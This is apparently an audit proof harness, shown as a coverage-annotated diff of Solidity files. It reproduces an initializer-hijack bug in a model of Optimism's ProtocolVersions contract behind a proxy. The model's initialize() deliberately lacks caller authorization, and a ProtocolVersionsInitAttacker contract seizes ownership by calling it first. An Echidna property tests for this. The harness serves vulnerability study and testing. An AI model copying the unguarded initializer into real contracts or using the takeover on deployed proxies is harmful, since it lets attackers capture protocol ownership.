@@ -1,0 +1,171 @@
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_optimism_f1_protocol_versions_init_hijack/src/EchidnaOptimismF1ProtocolVersionsInitHijackHarness.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | pragma solidity 0.8.24;
+  3 |     | 
+  4 |     | import {
+  5 |     |     OptimismF1SimpleProxy,
+  6 |     |     ProtocolVersionsLike,
+  7 |     |     ProtocolVersionsInitAttacker,
+  8 |     |     IProtocolVersionsLike
+  9 |     | } from "./OptimismF1ProtocolVersionsInitHijackHarness.sol";
+ 10 |     | 
+ 11 |     | /// @notice Echidna harness for ProtocolVersions initializer takeover.
+ 12 | *   | contract EchidnaOptimismF1ProtocolVersionsInitHijackHarness {
+ 13 |     |     OptimismF1SimpleProxy public proxy;
+ 14 |     |     IProtocolVersionsLike public protocolVersions;
+ 15 |     |     ProtocolVersionsInitAttacker public attacker;
+ 16 |     | 
+ 17 |     |     address public attackerOwner;
+ 18 |     | 
+ 19 | *   |     constructor() {
+ 20 | *   |         attackerOwner = address(0xBEEF);
+ 21 |     | 
+ 22 | *   |         ProtocolVersionsLike implementation = new ProtocolVersionsLike();
+ 23 | *   |         proxy = new OptimismF1SimpleProxy(address(this));
+ 24 | *   |         proxy.upgradeTo(address(implementation));
+ 25 | *   |         protocolVersions = IProtocolVersionsLike(address(proxy));
+ 26 | *   |         attacker = new ProtocolVersionsInitAttacker();
+ 27 |     |     }
+ 28 |     | 
+ 29 | *   |     function action_attacker_initialize() public {
+ 30 | *   |         try attacker.hijack(address(proxy), attackerOwner, 111, 222) {} catch {}
+ 31 |     |     }
+ 32 |     | 
+ 33 |     |     function echidna_non_admin_cannot_take_protocol_owner() public view returns (bool) {
+ 34 |     |         return protocolVersions.owner() != attackerOwner;
+ 35 |     |     }
+ 36 |     | }
+ 37 |     | 
+
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_optimism_f1_protocol_versions_init_hijack/src/OptimismF1ProtocolVersionsInitHijackHarness.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | pragma solidity 0.8.24;
+   3 |     | 
+   4 |     | interface IProtocolVersionsLike {
+   5 |     |     function initialize(address owner_, uint256 required_, uint256 recommended_) external;
+   6 |     |     function owner() external view returns (address);
+   7 |     |     function required() external view returns (uint256);
+   8 |     |     function recommended() external view returns (uint256);
+   9 |     |     function setRequired(uint256 required_) external;
+  10 |     |     function setRecommended(uint256 recommended_) external;
+  11 |     | }
+  12 |     | 
+  13 |     | /// @notice Minimal proxy with unstructured storage to avoid implementation slot collisions.
+  14 | *   | contract OptimismF1SimpleProxy {
+  15 |     |     bytes32 private constant IMPLEMENTATION_SLOT =
+  16 | *   |         bytes32(uint256(keccak256("optimism.f1.proxy.implementation")) - 1);
+  17 | *   |     bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("optimism.f1.proxy.admin")) - 1);
+  18 |     | 
+  19 |     |     error Unauthorized();
+  20 |     |     error ImplementationNotSet();
+  21 |     | 
+  22 | *   |     constructor(address admin_) {
+  23 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  24 | *   |         assembly {
+  25 | *   |             sstore(adminSlot, admin_)
+  26 |     |         }
+  27 |     |     }
+  28 |     | 
+  29 | *   |     function admin() public view returns (address admin_) {
+  30 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  31 | *   |         assembly {
+  32 | *   |             admin_ := sload(adminSlot)
+  33 |     |         }
+  34 |     |     }
+  35 |     | 
+  36 | *   |     function implementation() public view returns (address implementation_) {
+  37 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  38 | *   |         assembly {
+  39 | *   |             implementation_ := sload(implementationSlot)
+  40 |     |         }
+  41 |     |     }
+  42 |     | 
+  43 | *   |     function upgradeTo(address implementation_) external {
+  44 | *   |         if (msg.sender != admin()) revert Unauthorized();
+  45 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  46 | *   |         assembly {
+  47 | *   |             sstore(implementationSlot, implementation_)
+  48 |     |         }
+  49 |     |     }
+  50 |     | 
+  51 |     |     fallback() external payable {
+  52 | *   |         _delegate();
+  53 |     |     }
+  54 |     | 
+  55 |     |     receive() external payable {}
+  56 |     | 
+  57 | *   |     function _delegate() internal {
+  58 | *   |         address impl = implementation();
+  59 | *   |         if (impl == address(0)) revert ImplementationNotSet();
+  60 |     |         assembly {
+  61 | *   |             calldatacopy(0, 0, calldatasize())
+  62 | *   |             let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
+  63 | *   |             returndatacopy(0, 0, returndatasize())
+  64 | *   |             switch result
+  65 | *   |             case 0 { revert(0, returndatasize()) }
+  66 | *   |             default { return(0, returndatasize()) }
+  67 |     |         }
+  68 |     |     }
+  69 |     | }
+  70 |     | 
+  71 |     | /// @notice ProtocolVersions model preserving bug parity:
+  72 |     | ///         `initialize(...)` has no caller authorization guard.
+  73 | *   | contract ProtocolVersionsLike {
+  74 |     |     bool internal initialized;
+  75 |     |     address internal _owner;
+  76 |     |     uint256 internal _required;
+  77 |     |     uint256 internal _recommended;
+  78 |     | 
+  79 |     |     error AlreadyInitialized();
+  80 |     |     error Unauthorized();
+  81 |     |     error InvalidOwner();
+  82 |     | 
+  83 | *   |     constructor() {
+  84 |     |         // Bug parity with _disableInitializers on implementation deployment.
+  85 | *   |         initialized = true;
+  86 |     |     }
+  87 |     | 
+  88 | *   |     function initialize(address owner_, uint256 required_, uint256 recommended_) external {
+  89 | *   |         if (initialized) revert AlreadyInitialized();
+  90 | *   |         if (owner_ == address(0)) revert InvalidOwner();
+  91 | *   |         initialized = true;
+  92 | *   |         _owner = owner_;
+  93 | *   |         _required = required_;
+  94 | *   |         _recommended = recommended_;
+  95 |     |     }
+  96 |     | 
+  97 |     |     function owner() external view returns (address) {
+  98 |     |         return _owner;
+  99 |     |     }
+ 100 |     | 
+ 101 |     |     function required() external view returns (uint256) {
+ 102 |     |         return _required;
+ 103 |     |     }
+ 104 |     | 
+ 105 |     |     function recommended() external view returns (uint256) {
+ 106 |     |         return _recommended;
+ 107 |     |     }
+ 108 |     | 
+ 109 |     |     function setRequired(uint256 required_) external {
+ 110 |     |         if (msg.sender != _owner) revert Unauthorized();
+ 111 |     |         _required = required_;
+ 112 |     |     }
+ 113 |     | 
+ 114 |     |     function setRecommended(uint256 recommended_) external {
+ 115 |     |         if (msg.sender != _owner) revert Unauthorized();
+ 116 |     |         _recommended = recommended_;
+ 117 |     |     }
+ 118 |     | }
+ 119 |     | 
+ 120 |     | /// @notice Helper that performs first-caller initializer takeover.
+ 121 | *   | contract ProtocolVersionsInitAttacker {
+ 122 | *   |     function hijack(address proxy, address attackerOwner, uint256 required_, uint256 recommended_) external {
+ 123 | *   |         IProtocolVersionsLike(proxy).initialize(attackerOwner, required_, recommended_);
+ 124 |     |     }
+ 125 |     | 
+ 126 |     |     function mutateRequired(address proxy, uint256 required_) external {
+ 127 |     |         IProtocolVersionsLike(proxy).setRequired(required_);
+ 128 |     |     }
+ 129 |     | }
+ 130 |     | 
+
